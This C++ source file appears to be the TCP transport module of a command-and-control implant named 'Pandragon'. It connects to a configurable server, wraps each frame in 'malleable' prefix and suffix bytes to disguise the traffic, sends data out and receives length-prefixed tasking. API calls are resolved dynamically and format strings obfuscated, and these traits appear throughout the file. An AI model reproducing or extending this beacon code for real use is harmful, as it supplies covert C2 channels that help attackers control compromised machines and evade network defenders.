#include "../../include/generated_config.h"
#ifdef PANDRAGON_ENABLE_TCP

/*
 * tcp_socket.cpp: Plain TCP transport using ws2_32.dll Winsock API
 *
 * Signature matches TransportRequestFn so it can be swapped with winhttpRequest.
 * For TCP: dest and userAgent are ignored; host:port is the connection target.
 *
 * Wire format (length-prefixed frames):
 *   [4-byte BE length (N)] [N bytes: request body]
 *   [4-byte BE length (N)] [N bytes: response body]
 *
 * 30-second connect timeout via non-blocking socket + select().
 * Caller must __free() the returned buffer.
 */

#include "../../include/network/transport.h"
#include "../../include/utils.h"
#include "../bastia/bastia.h"
#include "../../include/pandragon_runtime.h"
/* NOTE: Do NOT include winsock2.h/ws2tcpip.h here.
 * All Winsock types (SOCKADDR_IN, fd_set, etc.) are already provided
 * by resolver.h via transport.h. Including them causes redefinition errors. */

static bool g_wsaInitialized = false;

// Resolve host to IPv4 address via inet_addr (direct IP) or getaddrinfo (DNS)
static bool resolveHost(functionTable* ntFt, const wchar_t* hostWide, uint16_t port, SOCKADDR_IN* outAddr) {
    if (!hostWide || !outAddr) return false;

    __builtin_memset(outAddr, 0, sizeof(SOCKADDR_IN));
    outAddr->sin_family = AF_INET;
    outAddr->sin_port = __htons(port);

    // Convert wide string to narrow
    char hostBuf[256] = {0};
    size_t hostLen = 0;
    for (; hostWide[hostLen] && hostLen < sizeof(hostBuf) - 1; hostLen++) {
        hostBuf[hostLen] = (char)hostWide[hostLen];
    }
    hostBuf[hostLen] = '\0';

    // Try direct IP parse first (fast path for IP literals)
    unsigned long ip = ntFt->inet_addr(hostBuf);
    if (ip != INADDR_NONE) {
        outAddr->sin_addr.s_addr = ip;
        return true;
    }

    // Fall back to DNS resolution via getaddrinfo
    ADDRINFOA hints;
    __builtin_memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    PADDRINFOA result = NULL;
    int rc = ntFt->getaddrinfo(hostBuf, NULL, &hints, &result);
    if (rc != 0 || !result) {
        c_debugPrint(ntFt, "[tcp] getaddrinfo(%s) failed: %d", hostBuf, rc);
        return false;
    }

    // Take the first IPv4 address
    for (PADDRINFOA p = result; p; p = p->ai_next) {
        if (p->ai_family == AF_INET && p->ai_addrlen >= sizeof(SOCKADDR_IN)) {
            __memcpy(outAddr, p->ai_addr, sizeof(SOCKADDR_IN));
            ntFt->freeaddrinfo(result);
            return true;
        }
    }

    // No IPv4 address found
    ntFt->freeaddrinfo(result);
    c_debugPrint(ntFt, "[tcp] No IPv4 address for %s", hostBuf);
    return false;
}

// Connect with 30-second timeout via non-blocking socket + select()
static bool connectWithTimeout(functionTable* ntFt, SOCKET s, const SOCKADDR_IN* addr) {
    // Set non-blocking
    u_long mode = 1;
    int rc = ntFt->Ioctlsocket(s, FIONBIO, &mode);
    if (rc != 0) {
        c_debugPrint(ntFt, "[tcp] Ioctlsocket(FIONBIO) failed: %d", ntFt->WSAGetLastError());
        return false;
    }

    // Initiate non-blocking connect
    rc = ntFt->connect(s, (const SOCKADDR*)addr, sizeof(SOCKADDR_IN));
    if (rc == 0) {
        // Connected immediately (localhost case)
        return true;
    }

    int err = ntFt->WSAGetLastError();
    if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) {
        c_debugPrint(ntFt, "[tcp] connect() failed: %d", err);
        return false;
    }

    // Wait for connect to complete with 30-second timeout
    fd_set writeSet;
    FD_ZERO(&writeSet);
    FD_SET(s, &writeSet);

    fd_set exceptSet;
    FD_ZERO(&exceptSet);
    FD_SET(s, &exceptSet);

    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;

    rc = ntFt->select(0, NULL, &writeSet, &exceptSet, &tv);
    if (rc <= 0) {
        c_debugPrint(ntFt, "[tcp] select() timeout or error: %d", rc);
        return false;
    }

    // Manual FD_ISSET replacement: check exceptSet for errors
    if (exceptSet.fd_count > 0 && exceptSet.fd_array[0] == s) {
        int sockErr = 0;
        int sockErrLen = sizeof(sockErr);
        ntFt->Getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&sockErr, &sockErrLen);
        c_debugPrint(ntFt, "[tcp] Connection failed (SO_ERROR=%d)", sockErr);
        return false;
    }

    // Reset to blocking mode for send/recv
    mode = 0;
    ntFt->Ioctlsocket(s, FIONBIO, &mode);
    return true;
}

std::pair<void*, size_t> tcpSocketRequest(
    functionTable* funcTable,
    const wchar_t*   host,
    const wchar_t*   /*dest*/,       // Ignored for TCP
    const wchar_t*   /*userAgent*/,  // Ignored for TCP
    uint16_t         port,
    const void*      bodyData,
    size_t           bodyLen
) {
    c_debugPrint(funcTable, "[tcp] Connecting to %ls:%u (body=%zu bytes)",
                 host ? host : L"(null)", (unsigned)port, bodyLen);

    REQUIRES_MODULE(funcTable, ModuleCache::MOD_WS2_32);

    // Resolve host
    SOCKADDR_IN serverAddr = {};
    if (!resolveHost(funcTable, host, port, &serverAddr)) {
        c_debugPrint(funcTable, "[tcp] Host resolution failed for %ls", host ? host : L"(null)");
        return { nullptr, 0 };
    }

    char ipStr[16] = {0};
    if (!funcTable->InetNtopA(AF_INET, &serverAddr.sin_addr, ipStr, sizeof(ipStr))) {
        /* Fallback: manual formatting if InetNtopA fails */
        const uint8_t* b = (const uint8_t*)&serverAddr.sin_addr.s_addr;
        __snprintf(ipStr, sizeof(ipStr), lcg_encrypt("%u.%u.%u.%u"), b[0], b[1], b[2], b[3]);
    }
    c_debugPrint(funcTable, "[tcp] Resolved to %s:%u", ipStr, (unsigned)port);

    // Initialize Winsock once
    if (!g_wsaInitialized) {
        WSADATA wsaData = {};
        int rc = funcTable->WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (rc != 0) {
            c_debugPrint(funcTable, "[tcp] WSAStartup failed: %d", rc);
            return { nullptr, 0 };
        }
        g_wsaInitialized = true;
    }

    // Create TCP socket
    SOCKET s = funcTable->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        c_debugPrint(funcTable, "[tcp] socket() failed: %d", funcTable->WSAGetLastError());
        return { nullptr, 0 };
    }

    // Connect with timeout
    if (!connectWithTimeout(funcTable, s, &serverAddr)) {
        c_debugPrint(funcTable, "[tcp] Connection to %s:%u failed", ipStr, (unsigned)port);
        funcTable->closesocket(s);
        return { nullptr, 0 };
    }

    c_debugPrint(funcTable, "[tcp] Connected to %s:%u", ipStr, (unsigned)port);

    // Build frame: [prefix][body][suffix]
    size_t prefixLen = ::getTcpMalleablePrefixLen();
    const void* prefix = ::getTcpMalleablePrefix();
    size_t suffixLen = ::getTcpMalleableSuffixLen();
    const void* suffix = ::getTcpMalleableSuffix();

    size_t totalBody = prefixLen + (bodyLen > 0 ? bodyLen : 0) + suffixLen;

    // Send length-prefixed frame: [4-byte BE length][prefix][body][suffix]
    uint8_t lengthPrefix[4];
    lengthPrefix[0] = (uint8_t)((totalBody >> 24) & 0xFF);
    lengthPrefix[1] = (uint8_t)((totalBody >> 16) & 0xFF);
    lengthPrefix[2] = (uint8_t)((totalBody >> 8) & 0xFF);
    lengthPrefix[3] = (uint8_t)(totalBody & 0xFF);

    // Send length prefix
    int sent = funcTable->send(s, (const char*)lengthPrefix, 4, 0);
    if (sent != 4) {
        c_debugPrint(funcTable, "[tcp] Failed to send length prefix: sent=%d, err=%d",
                     sent, funcTable->WSAGetLastError());
        funcTable->closesocket(s);
        return { nullptr, 0 };
    }

    // Send prefix if present
    if (prefixLen > 0 && prefix) {
        sent = funcTable->send(s, (const char*)prefix, (int)prefixLen, 0);
        if (sent != (int)prefixLen) {
            c_debugPrint(funcTable, "[tcp] Failed to send prefix: sent=%d, err=%d",
                         sent, funcTable->WSAGetLastError());
            funcTable->closesocket(s);
            return { nullptr, 0 };
        }
    }

    // Send body if present
    if (bodyData && bodyLen > 0) {
        size_t remaining = bodyLen;
        const char* ptr = (const char*)bodyData;
        while (remaining > 0) {
            sent = funcTable->send(s, ptr, (int)remaining, 0);
            if (sent <= 0) {
                c_debugPrint(funcTable, "[tcp] send() failed: %d", funcTable->WSAGetLastError());
                funcTable->closesocket(s);
                return { nullptr, 0 };
            }
            ptr += sent;
            remaining -= sent;
        }
        c_debugPrint(funcTable, "[tcp] Sent %zu bytes of body", bodyLen);
    }

    // Send suffix if present
    if (suffixLen > 0 && suffix) {
        sent = funcTable->send(s, (const char*)suffix, (int)suffixLen, 0);
        if (sent != (int)suffixLen) {
            c_debugPrint(funcTable, "[tcp] Failed to send suffix: sent=%d, err=%d",
                         sent, funcTable->WSAGetLastError());
            funcTable->closesocket(s);
            return { nullptr, 0 };
        }
        c_debugPrint(funcTable, "[tcp] Sent %zu bytes of suffix", suffixLen);
    }

    c_debugPrint(funcTable, "[tcp] Sent %zu bytes total frame (prefix=%zu + body=%zu + suffix=%zu)",
                 totalBody, prefixLen, bodyLen, suffixLen);

    // Receive response: [4-byte BE length][prefix][encrypted][suffix]
    uint8_t respLenBuf[4] = {0};
    int received = 0;
    int totalReceived = 0;

    // Read 4-byte length prefix
    while (totalReceived < 4) {
        received = funcTable->recv(s, (char*)(respLenBuf + totalReceived), 4 - totalReceived, 0);
        if (received <= 0) {
            c_debugPrint(funcTable, "[tcp] recv() length prefix failed: %d", funcTable->WSAGetLastError());
            funcTable->closesocket(s);
            return { nullptr, 0 };
        }
        totalReceived += received;
    }

    uint32_t respLen = ((uint32_t)respLenBuf[0] << 24) |
                       ((uint32_t)respLenBuf[1] << 16) |
                       ((uint32_t)respLenBuf[2] << 8)  |
                       ((uint32_t)respLenBuf[3]);

    c_debugPrint(funcTable, "[tcp] Response length: %u bytes", (unsigned)respLen);

    // Handle zero-length response (e.g., no tasks)
    if (respLen == 0) {
        funcTable->closesocket(s);
        return { nullptr, 0 };
    }

    // Sanity check: cap at max_response_size from config to avoid allocation bombs
    uint32_t max_response_size = 67108864;
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    max_response_size = runtime.getConfig().max_response_size;
    if (respLen > max_response_size) {
        c_debugPrint(funcTable, "[tcp] Response too large (%u bytes, max=%u), discarding",
                     (unsigned)respLen, (unsigned)max_response_size);
        funcTable->closesocket(s);
        return { nullptr, 0 };
    }

    // Allocate buffer for response body
    char* content = (char*)__malloc(respLen + 1);
    if (!content) {
        c_debugPrint(funcTable, "[tcp] malloc(%u) failed", (unsigned)respLen);
        funcTable->closesocket(s);
        return { nullptr, 0 };
    }

    // Read response body in chunks
    totalReceived = 0;
    uint32_t remaining = respLen;
    char* writePtr = content;
    uint8_t readBuf[4096];

    while (remaining > 0) {
        uint32_t toRead = remaining > sizeof(readBuf) ? sizeof(readBuf) : remaining;
        received = funcTable->recv(s, (char*)readBuf, toRead, 0);
        if (received <= 0) {
            c_debugPrint(funcTable, "[tcp] recv() body failed: %d (got %d/%u)",
                         funcTable->WSAGetLastError(), totalReceived, (unsigned)respLen);
            __free(content);
            funcTable->closesocket(s);
            return { nullptr, 0 };
        }
        __memcpy(writePtr, readBuf, received);
        writePtr += received;
        totalReceived += received;
        remaining -= received;
    }

    content[respLen] = '\0';

    c_debugPrint(funcTable, "[tcp] Received %u bytes", (unsigned)respLen);

    // Clean up socket
    funcTable->closesocket(s);

    return { content, (size_t)respLen };
}
#endif
